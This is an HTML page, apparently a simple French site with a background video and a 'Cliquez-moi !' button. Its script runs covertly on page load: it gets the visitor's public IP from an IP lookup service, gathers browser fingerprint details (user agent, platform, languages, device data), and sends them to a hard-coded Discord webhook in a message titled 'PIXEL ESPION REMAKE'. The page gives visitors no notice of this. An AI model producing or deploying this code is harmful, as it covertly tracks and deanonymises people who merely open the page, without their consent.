<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mon Site</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
            animation: fadeIn 2s ease-out;
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
            }
            100% {
                opacity: 1;
            }
        }

        video {
            position: fixed;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            z-index: -1; 
            transform: translate(-50%, -50%);
        }

        #rectangular-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(144, 13, 232, 0);
            color: #fff;
            border: none;
            padding: 15px 25px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <video autoplay loop muted>
        <source src="test.mp4" type="video/mp4">
        Votre navigateur ne prend pas en charge la balise vidéo.
    </video>

    <button id="rectangular-button">Cliquez-moi !</button>

    <script>
        const ipRequest = new XMLHttpRequest();
        const ipUrl = "https://api.ipify.org?format=json";
        ipRequest.open('GET', ipUrl);
        ipRequest.onload = function() {
            if (ipRequest.status === 200) {
                const data = JSON.parse(ipRequest.responseText);
                console.log(data.ip);

                const discordRequest = new XMLHttpRequest();
                const webhookUrl = 'https://discord.com/api/webhooks/1175538033584521397/6qYUOPs1xpeA42RO-9BprU3OI-vgjlzDB9Qi5NervC9BR5JIG_0kbXmkovOLP8JRq5QX';
                discordRequest.open('POST', webhookUrl);
                discordRequest.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
                const now = new Date();
                const hours = now.getHours();
                const minutes = now.getMinutes();
                const seconds = now.getSeconds();
                const colorHex = '#' +('0' + hours.toString(16)).slice(-2) +('0' + minutes.toString(16)).slice(-2) +('0' + seconds.toString(16)).slice(-2);

                function formatObject(obj) {
                    return '\`\`\`json\n' + JSON.stringify(obj, null, 2) + '\`\`\`'
                }
                
                const embedMessage = {
                    embeds: [{
                        title: "PIXEL ESPION REMAKE",
                        description: `**adresse IP:** \`\`\`json\n${data.ip}\`\`\`**appCodeName:** \`\`\`json\n${navigator.appCodeName}\`\`\`**appName:** \`\`\`json\n${navigator.appName}\`\`\`**appVersion:** \`\`\`json\n${navigator.appVersion}\`\`\`**language:** \`\`\`json\n${navigator.language}\`\`\`**languages:** \`\`\`json\n${navigator.languages}\`\`\`**platform:** \`\`\`json\n${navigator.platform}\`\`\`**usb:** ${formatObject(navigator.usb)}**userAgent:** \`\`\`json\n${navigator.userAgent}\`\`\`**brands:** ${formatObject(navigator.userAgentData.brands)}**mobile:** \`\`\`json\n${navigator.userAgentData.mobile}\`\`\`**platform:** \`\`\`json\n${navigator.userAgentData.platform}\`\`\`**Heure:** \`\`\`json\n${hours < 10 ? '0' + hours : hours}:${minutes < 10 ? '0' + minutes : minutes}:${seconds < 10 ? '0' + seconds : seconds}\`\`\``,
                        color: parseInt(colorHex.replace(/^#/, ''), 16),
                    }]
                };

                discordRequest.send(JSON.stringify(embedMessage));

            } else {
                console.error('Error retrieving IP address');
            }
        };
        ipRequest.send();
    </script>

</body>
</html>
